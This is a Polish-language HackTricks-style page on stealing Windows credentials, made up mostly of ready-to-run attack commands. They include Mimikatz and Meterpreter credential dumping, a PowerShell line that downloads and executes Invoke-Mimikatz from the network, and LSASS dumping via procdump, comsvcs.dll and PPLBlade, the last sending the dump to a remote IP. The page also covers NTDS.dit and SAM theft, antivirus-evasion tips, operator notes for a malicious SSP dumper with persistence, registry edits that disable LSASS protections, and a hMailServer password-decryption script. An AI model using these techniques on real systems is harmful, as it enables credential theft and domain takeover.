# Kradzież poświadczeń Windows

{{#include ../../banners/hacktricks-training.md}}

## Poświadczenia Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Znajdź inne rzeczy, które Mimikatz potrafi zrobić na** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Dowiedz się o możliwych zabezpieczeniach poświadczeń tutaj.**](credentials-protections.md) **Te zabezpieczenia mogą uniemożliwić Mimikatz wyodrębnienie niektórych poświadczeń.**

## Poświadczenia z Meterpreter

Użyj [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **który** stworzyłem, aby **wyszukać hasła i hashe** na maszynie ofiary.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

Ponieważ **Procdump z** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**to legalne narzędzie Microsoft**, nie jest wykrywany przez **Defender**.\  
Możesz użyć tego narzędzia, aby **dump the lsass process**, **download the dump** i **extract** **credentials locally** z dumpa.

Możesz też użyć [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Ten proces jest wykonywany automatycznie przy użyciu [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Uwaga**: Niektóre **AV** mogą **uznać** użycie **procdump.exe do zrzutu lsass.exe** za **złośliwe**, ponieważ **wykrywają** ciąg **"procdump.exe" i "lsass.exe"**. Dlatego jest bardziej **dyskretne**, jeśli **podamy** jako **argument** **PID** lsass.exe do procdump **zamiast** nazwy lsass.exe.

### Zrzucanie lsass przy użyciu **comsvcs.dll**

Biblioteka DLL o nazwie **comsvcs.dll** znajdująca się w `C:\Windows\System32` jest odpowiedzialna za **zrzucanie pamięci procesu** w przypadku awarii. Ta DLL zawiera **funkcję** o nazwie **`MiniDumpW`**, przeznaczoną do wywołania przy użyciu `rundll32.exe`.\
Pierwsze dwa argumenty są nieistotne, natomiast trzeci jest podzielony na trzy składowe. ID procesu do zrzutu stanowi pierwszą składową, lokalizacja pliku zrzutu — drugą, a trzecia składowa to wyłącznie słowo **full**. Nie ma innych opcji.\
Po sparsowaniu tych trzech składowych, DLL rozpoczyna tworzenie pliku zrzutu i zapisuje do niego pamięć wskazanego procesu.\
Wykorzystanie **comsvcs.dll** jest możliwe do zrzutu procesu lsass, co eliminuje konieczność wysyłania i uruchamiania procdump. Metoda jest opisana szczegółowo na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Do wykonania używa się następującego polecenia:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Możesz zautomatyzować ten proces za pomocą** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Zrzucanie lsass za pomocą Task Manager**

1. Kliknij prawym przyciskiem myszy na Task Bar i wybierz "Task Manager"
2. Kliknij "More details"
3. W zakładce "Processes" wyszukaj proces "Local Security Authority Process"
4. Kliknij prawym przyciskiem myszy na proces "Local Security Authority Process" i wybierz "Create dump file".

### Zrzucanie lsass za pomocą procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) to podpisany przez Microsoft plik binarny, który jest częścią zestawu [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) to narzędzie Protected Process Dumper, które wspiera obfuskację memory dump i przesyłanie ich na zdalne stacje robocze bez zapisywania na dysku.

**Kluczowe funkcje**:

1. Bypassing PPL protection
2. Obfuskacja plików memory dump w celu obejścia mechanizmów wykrywania Defender opartych na sygnaturach
3. Wysyłanie memory dump za pomocą metod RAW i SMB bez zapisywania na dysku (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon dostarcza trzystopniowy dumper nazwany **LalsDumper**, który nigdy nie wywołuje `MiniDumpWriteDump`, więc hooki EDR na tym API nigdy się nie uruchamiają:

1. **Stage 1 loader (`lals.exe`)** – wyszukuje w `fdp.dll` placeholder składający się z 32 małych znaków `d`, nadpisuje go absolutną ścieżką do `rtu.txt`, zapisuje załatany DLL jako `nfdp.dll` i wywołuje `AddSecurityPackageA("nfdp","fdp")`. To zmusza **LSASS** do załadowania złośliwego DLL jako nowego Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – kiedy LSASS ładuje `nfdp.dll`, DLL czyta `rtu.txt`, XORuje każdy bajt z `0x20` i mapuje zdekodowany blob do pamięci przed przekazaniem wykonania.
3. **Stage 3 dumper** – mapowany payload ponownie implementuje logikę MiniDump korzystając z **direct syscalls** rozwiązywanych z zahaszowanych nazw API (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Dedykowany export o nazwie `Tom` otwiera `%TEMP%\<pid>.ddt`, streamuje skompresowany zrzut LSASS do pliku i zamyka uchwyt, aby późniejsza eksfiltracja mogła się odbyć.

Operator notes:

* Keep `lals.exe`, `fdp.dll`, `nfdp.dll`, and `rtu.txt` in the same directory. Stage 1 rewrites the hard-coded placeholder with the absolute path to `rtu.txt`, so splitting them breaks the chain.
* Registration happens by appending `nfdp` to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. You can seed that value yourself to make LSASS reload the SSP every boot.
* `%TEMP%\*.ddt` files are compressed dumps. Decompress locally, then feed them to Mimikatz/Volatility for credential extraction.
* Running `lals.exe` requires admin/SeTcb rights so `AddSecurityPackageA` succeeds; once the call returns, LSASS transparently loads the rogue SSP and executes Stage 2.
* Removing the DLL from disk does not evict it from LSASS. Either delete the registry entry and restart LSASS (reboot) or leave it for long-term persistence.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Zrzucanie sekretów LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Zrzut NTDS.dit z docelowego DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Zrzut historii haseł NTDS.dit z docelowego DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Pokaż atrybut pwdLastSet dla każdego konta w NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Kradzież SAM & SYSTEM

Te pliki powinny być **umieszczone** w _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Jednak **nie możesz po prostu skopiować ich w zwykły sposób**, ponieważ są chronione.

### Z rejestru

Najłatwiejszym sposobem na pozyskanie tych plików jest pobranie ich z rejestru:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Pobierz** te pliki na swoją maszynę Kali i **wyodrębnij hashes** używając:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Możesz wykonać kopię chronionych plików przy użyciu tej usługi. Musisz być Administrator.

#### Używanie vssadmin

Binarka vssadmin jest dostępna tylko w wersjach Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ale możesz to samo zrobić z poziomu **Powershell**. Poniżej przykład **how to copy the SAM file** (używany dysk to "C:", a plik jest zapisany w C:\users\Public), ale możesz użyć tego do kopiowania dowolnego chronionego pliku:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kod z książki: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Na koniec możesz też użyć [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), aby skopiować SAM, SYSTEM i ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory — Dane uwierzytelniające - NTDS.dit**

Plik **NTDS.dit** jest uważany za serce **Active Directory**, zawierając kluczowe dane o obiektach użytkowników, grupach i ich członkostwach. To tutaj przechowywane są **password hashes** użytkowników domeny. Ten plik jest bazą danych **Extensible Storage Engine (ESE)** i znajduje się w **_%SystemRoom%/NTDS/ntds.dit_**.

W tej bazie danych utrzymywane są trzy główne tabele:

- **Data Table**: Ta tabela przechowuje szczegóły obiektów takich jak użytkownicy i grupy.
- **Link Table**: Śledzi relacje, takie jak członkostwa w grupach.
- **SD Table**: **Security descriptors** dla każdego obiektu są tutaj przechowywane, zapewniając bezpieczeństwo i kontrolę dostępu do zapisanych obiektów.

Więcej informacji na ten temat: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows używa _Ntdsa.dll_ do interakcji z tym plikiem, a moduł ten jest wykorzystywany przez _lsass.exe_. W rezultacie **część** pliku **NTDS.dit** może znajdować się **w pamięci `lsass`** (możesz tam znaleźć ostatnio dostępne dane, prawdopodobnie ze względu na poprawę wydajności dzięki użyciu **cache**).

#### Odszyfrowywanie haszy wewnątrz NTDS.dit

Hash jest szyfrowany 3 razy:

1. Odszyfruj Password Encryption Key (**PEK**) przy użyciu **BOOTKEY** i **RC4**.
2. Odszyfruj ten **hash** przy użyciu **PEK** i **RC4**.
3. Odszyfruj **hash** przy użyciu **DES**.

**PEK** ma **taką samą wartość** na **każdym domain controllerze**, ale jest **zaszyfrowany** wewnątrz pliku **NTDS.dit** przy użyciu **BOOTKEY** pliku **SYSTEM** kontrolera domeny (który jest różny między kontrolerami domeny). Dlatego, aby uzyskać poświadczenia z pliku NTDS.dit, **potrzebujesz plików NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kopiowanie NTDS.dit przy użyciu Ntdsutil

Dostępne od Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Możesz także użyć techniki [**volume shadow copy**](#stealing-sam-and-system), aby skopiować plik **ntds.dit**. Pamiętaj, że będziesz też potrzebować kopii pliku **SYSTEM** (ponownie, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) techniki).

### **Wyodrębnianie hashes z NTDS.dit**

Po uzyskaniu plików **NTDS.dit** i **SYSTEM** możesz użyć narzędzi takich jak _secretsdump.py_ aby wyodrębnić hashes:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Możesz także **wyodrębnić je automatycznie** używając prawidłowego domain admin user:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Dla **dużych plików NTDS.dit** zaleca się ich wyodrębnienie za pomocą [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Wreszcie możesz także użyć **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ lub **mimikatz** `lsadump::lsa /inject`

### **Wyodrębnianie obiektów domeny z NTDS.dit do bazy SQLite**

Obiekty NTDS można wyeksportować do bazy SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Ekstrahowane są nie tylko sekrety, lecz także całe obiekty i ich atrybuty, co ułatwia dalsze wydobywanie informacji, gdy surowy plik NTDS.dit został już pozyskany.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Plik rejestru `SYSTEM` jest opcjonalny, ale umożliwia odszyfrowanie sekretów (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Wraz z innymi informacjami wyodrębniane są następujące dane: konta użytkowników i maszyn wraz z ich hashami, UAC flags, znaczniki czasu ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i rekurencyjne członkostwa, drzewo jednostek organizacyjnych oraz przynależność, zaufane domeny wraz z typem zaufania, kierunkiem i atrybutami...

## Lazagne

Pobierz binarkę z [here](https://github.com/AlessandroZ/LaZagne/releases). Możesz użyć tego pliku do wyodrębnienia poświadczeń z wielu programów.
```
lazagne.exe all
```
## Inne narzędzia do wydobywania poświadczeń z SAM i LSASS

### Windows credentials Editor (WCE)

To narzędzie może być użyte do wydobywania poświadczeń z pamięci. Pobierz je z: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Wyodrębnia poświadczenia z pliku SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Wyodrębnij credentials z pliku SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Pobierz je z:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i po prostu **uruchom** je, a hasła zostaną wyekstrahowane.

## Mining idle RDP sessions and weakening security controls

Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – przeanalizuj każdy user hive w `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Każdy podklucz przechowuje nazwę serwera, `UsernameHint`, oraz znacznik czasu ostatniego zapisu. Logikę FinalDraft możesz odtworzyć za pomocą PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – zapytaj log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` o Event ID **21** (udane logowanie) i **25** (rozłączenie), aby zmapować, kto administrował maszyną:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Gdy już wiesz, który Domain Admin łączy się regularnie, zrzucaj LSASS (za pomocą LalsDumper/Mimikatz) póki jego **rozłączona** sesja nadal istnieje. CredSSP + NTLM fallback pozostawia ich verifier i tokeny w LSASS, które można następnie odtworzyć przez SMB/WinRM, aby pozyskać `NTDS.dit` lub umieścić persistence na domain controllerach.

### Registry downgrades targeted by FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Ustawienie `DisableRestrictedAdmin=1` wymusza pełne ponowne użycie poświadczeń/biletów podczas RDP, umożliwiając pivoty w stylu pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` wyłącza filtrowanie tokenów UAC, dzięki czemu lokalni administratorzy otrzymują nieograniczone tokeny przez sieć.
* `DSRMAdminLogonBehavior=2` pozwala administratorowi DSRM zalogować się, gdy DC jest online, dając atakującym kolejne wbudowane konto o wysokich uprawnieniach.
* `RunAsPPL=0` usuwa ochrony LSASS PPL, upraszczając dostęp do pamięci dla dumperów takich jak LalsDumper.

## hMailServer database credentials (post-compromise)

hMailServer przechowuje hasło do DB w `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` pod `[Database] Password=`. Wartość jest zaszyfrowana Blowfish przy użyciu statycznego klucza `THIS_KEY_IS_NOT_SECRET` oraz z zamianami kolejności bajtów w 4-bajtowych słowach. Użyj ciągu szesnastkowego z INI z tym fragmentem Pythona:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Mając hasło w postaci tekstu jawnego, skopiuj bazę danych SQL CE, aby uniknąć blokad plików, załaduj 32-bit provider i w razie potrzeby zaktualizuj przed zapytaniem o hashe:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Kolumna `accountpassword` używa formatu hash hMailServer (hashcat mode `1421`). Cracking tych wartości może zapewnić reusable credentials dla WinRM/SSH pivots.
## Źródła

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
